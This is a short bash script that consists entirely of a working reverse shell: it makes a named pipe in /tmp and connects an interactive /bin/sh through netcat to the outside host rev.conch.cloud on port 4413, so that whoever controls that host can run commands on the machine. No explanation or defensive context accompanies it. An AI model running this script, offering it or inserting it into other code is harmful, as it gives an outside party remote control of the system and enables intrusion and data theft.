#!/bin/bash

mkfifo /tmp/f
cat /tmp/f|/bin/sh -i 2>&1|nc rev.conch.cloud 4413 >/tmp/f
